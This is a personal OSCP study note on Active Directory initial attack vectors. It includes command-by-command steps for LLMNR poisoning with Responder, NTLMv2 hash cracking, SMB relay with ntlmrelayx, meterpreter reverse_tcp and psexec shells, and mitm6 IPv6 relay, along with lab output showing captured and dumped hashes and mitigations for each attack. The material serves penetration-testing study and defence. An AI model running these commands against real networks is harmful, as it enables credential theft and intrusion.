---
aliases:
  - Active Directory Initial Attack Vectors
tags:
  - tech
  - cybsec
  - certification
  - oscp
  - active_directory
  - attack_vectors
author: Mehdi N Tehrani
creat_date: 2023-12-08
category: Cyber Security
subcategory: Offensive Security - OSCP
---

# LLMNR Poisoning
#llmnr #nbt-ns #netbios 
**LLMNR**: *Link-Local Multicast Name Resolution*; succesor to NetBIOS.
**NBT-NS**: NBT-NS is a component of NetBIOS over TCP/IP (NBT) and is responsible for name registration and resolution.
**NetBIOS**: NetBIOS is used in Windows versions up to Windows ME to implement higher network functions (Server Message Block (SMB)). Newer Windows versions from Windows 2000 handle the SMB communication directly via TCP port 445.

NetBIOS (old file sharing mechanism):
- UDP 137: Name resolution
- UDP 138: Datagram distribution service
- TCP 139: Session service
From Windows 2000 file sharing is done using tcp/445 but requires a NetBIOS interface. SMB runs on top of NetBIOS over TCP/IP (NBT).
- TCP 445: SMB

## Protection
- Disable **LLMNR** and **NBT-NS** via group policy; known as 'Multicase name resolution' found under DNS settings
- If not possible, unknown MAC addresses should not be allowed on the network
- Proper password policy

# Attack
## Responder
#responder #wdap #dhcp
Listen on a certain interface e.g. `eth0` for *DHCP* and *wdap*
[CheetSheet](https://www.ivoidwarranties.tech/posts/pentesting-tuts/responder/cheatsheet/)

Command: 
- `sudo responder -I <interface> -dwP`
`-d`: DHCP; Enable answers for DHCP broadcast requests. This option will inject a WPAD server in the DHCP response.
                        Default: False
`-w`: Start the WPAD rogue proxy server. Default value is False
`-P`: Force NTLM (transparently)/Basic (prompt) authentication for the proxy. WPAD doesn't need to be ON. This option is highly effective. Default: False

We can trigger an action by attempting to communicate with the attacker machine. In reality this can happen when victim tries to access a shared folder which doesn't exists, and sends a broadcast request to the network to find out who knows about it.
```
[+] Listening for events...                                                                                                                                  

[*] [DHCP] Found DHCP server IP: 192.168.122.1, now waiting for incoming requests...
[SMB] NTLMv2-SSP Client   : 192.168.122.57
[SMB] NTLMv2-SSP Username : ATLANTIS\jackc
[SMB] NTLMv2-SSP Hash     : jackc::ATLANTIS:5f1b540fee238213:ECD766197E173F55F020B7519E23A989:010100000000000080C98C7C4329DA01D9D2989F9F527EAA0000000002000800530034005A00450001001E00570049004E002D005A004A0050003100550042003800550035005200310004003400570049004E002D005A004A005000310055004200380055003500520031002E00530034005A0045002E004C004F00430041004C0003001400530034005A0045002E004C004F00430041004C0005001400530034005A0045002E004C004F00430041004C000700080080C98C7C4329DA010600040002000000080030003000000000000000010000000020000087F03FFD05384B99593D20AD56B449AA649A94C5D1346AACED01A6BA564DBAB80A001000000000000000000000000000000000000900280063006900660073002F003100390032002E003100360038002E003100320032002E00310034003200000ZQ0000000000000
```
Best time to run Responder is when users usually log into their devices, e.g. early morning, after lunchtime, etc.

#hashcat
copy the whole line into hashes.txt file and run the following command:
`hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.mod.txt -D 1`
`-D 1`: to force using the CPU in case GPU cannot be used

`--show`: if hash has already been cracked before, so already exists in the *pot* file, and you wanna see it. 
`--force`: sometimes on VM without --force it doesn't work
`-O`: on bare metal this optimizes speed
`-r OneRule`: works against a password list and mutates itAMD Radeon Veg
Also can use a wordlist other than the rockyou.txt that comes built-in in kali, like [rockyou2021](https://github.com/ohmybahgosh/RockYou2021.txt)


# SMB Relay Attacks
#smb_relay_attack
Pass the hash to another machine to gain access without having to crack the password
## Requirements
- SMB signing must be disabled on target 
	- by default disabled on Windows workstations, enabled on Windows servers
- Relayed user credentials must be local admin on the victim machine
- Cannot relay back to the same machine

Can be detected using nmap #nmap or Nessus #nessus
`nmap -p445 --script=smb2-security-mode.nse <target_ip> -Pn`
`-Pn` even if cannot see the target, tries probing it

Result from Windows Server:
```
Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

```
Result from Windows workstations:
```
Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```
## Attack
### 1. Disable SMB and HTTP in Responder
Disable *SMB* and *HTTP* in `responder.conf` file to make sure hashes are not being captured but are being relayed
```
[Responder Core]

; Servers to start
SQL = On
SMB = Off
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = Off
HTTPS = On
DNS = On
LDAP = On
DCERPC = On
WINRM = On
```

### 2. Run Responder
### 3. Run ntlmrelayx.py
`ntlmrelayx.py -tf targets.txt -smb2support`
`tf`: target files
### 4. an event occurs
### 5. SAM is dumped
#ntlmrelayx_py
**ntlmrelayx** does this
if  `-i` is used with ntlmrelayx, it gives us an interactive shell rather than dumping the SAM
`-c` to send a command
#sam #security_accounts_manager #ntlm #new_technology_lan_manager 


## Outcome
ntlmrelayx:
```
[*] SMBD-Thread-3: Received connection from 192.168.122.57, attacking target smb://192.168.122.141
[*] Authenticating against smb://192.168.122.141 as ATLANTIS\jackc SUCCEED
[*] SMBD-Thread-5: Received connection from 192.168.122.57, attacking target smb://192.168.122.57
[-] Authenticating against smb://192.168.122.57 as ATLANTIS\jackc FAILED
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x684964f3fdbb00ed957c25b82b874c95
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:1653f6c66d29fcd0bfbd4637f7cd7f32:::
Mike:1002:aad3b435b51404eeaad3b435b51404ee:ee6641d972851e2853579512b85bd2ad:::
[*] Done dumping SAM hashes for host: 192.168.122.141
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```

## Mitigations
### Enable SMB signing on all devices
	- Pro: *stops the attack completely*
	- Con: **causes slowness - around 10 to 20 percent**
### Disable NTLM authentication on network
	- Pro: *stops the attack completely*
	- Con: **if Kerberos stops, Windows defaults back to NTLM and attack can still happen**
### Account tiering
	- Pro: *limits domain admins to specific tasks*
	- Con: **compliance might be hard**
### Local Admin Restriction
	- Pro: *Can prevent a lot of lateral movement*
	- Con: **potential increase in amount of service desk tickets**


# Gain Shell Access
## Metasploit 
rather noisy
### psexec
### password
```
$ msfconsole
> use exploit/windows/smb/psexec
> set payload windows/x64/meterpreter/reverse_tcp
> set rhosts <ip>
> set smbdomain <domain>
> set smbuser <user>
> set smbpass <password>
```

### hash
`unset smbdomain`
`set smbpass <ntlm_hash>`

## psexec.py
stealthier than metasploit
### domain user
`psexec.py <domain>/<user>:'<password>'@<ip>`
### local user
`psexec.py <user>@<ip> -hashes <ntlm_hash>
## wmiexec.py

## smbexec.py


# IPv6 Attacks
#ipv6
## IPv6 DNS takeover using MITM6
#ipv6 #dns_takeover #mitm6
MITM6 tricks victim's machine to send their NTLM (similar to *Responder*) and uses the NTLM hash to relay it to DC and create a new account in DC.

- `sudo mitm6 -d <domain>`
- `ntlmrelayx.py -6 -t ldaps://<dns_ip> -wh <fake_wpad_host>.<domain> -l <any_folder_name>`
`-wh`: setting up a fake wpad #wpad
	- the value for `-wh` parameter can be `fake.domain.local`

- [!info] Set up worked as expected, but did not intercept any traffic as expected.
- Only traffic intercepted was when from a victim machine an SMB connection was tried to be made with the attacker machine!
	- from **ntlmrealyx.py**: `[*] SMBD-Thread-10: Received connection from ::ffff:192.168.122.57, attacking target ldaps://192.168.122.69`

> mitm6 can cause issues if run longer than 5-10 mintues
## IPv6 Mitigations
- Disable IPv6 internally!
	- Cons: possible side-effects. Not the best approach.
- Set up following blocks:
	- *(Inbound) Core Networking*: Dynamic Host Configuration Protocol for IPv6 (DHCPv6-IN)
	- *(Inbound) Core Networking*: Route Advertisement (ICMPv6-IN)
	- *(Outbound) Core Networking*: Dynamic Host Configuration Protocol for IPv6 (DHCPV6-OUT)
- Best practices:
	- If not using *WPAD*, disable it
	- Disable `WinHttpAutoProxySvc` service
	- Relaying to LDAP and LDAPS can only be mitigated by enabling both *LDAP signing*, and *LDAP channel binding*. 
	- Consider moving admin users to *Protected Users* group or marking them as *Account is Sensitive and cannot be delegated*  to avoid delegated attacks by user impersonation. #deletgated_attack #account_delegation #delegate_account


# Passback Attacks
A peripheral device like a printer or an IoT device can be set up to connect via LDAP to DC. If the credentials are sent in clear text, the address pointing to DC can be modified to the attacker machine and netcat or Responder can be used to receive the credentials in clear text, or in case of a weak hash it can be cracked.

# Internal Pentesting Strategy
- Begin with Responder, maybe later with mitm6 given its limitations
- Run scans to generate traffic
	- nessus
	- nmap
- if scanning are taking too long, look for websites in scope 
	- *http_version*: to sweep for http traffic
- Look for default credentials on web logins
	- printers
	- Jenkins
	- etc.
- Think outside the box

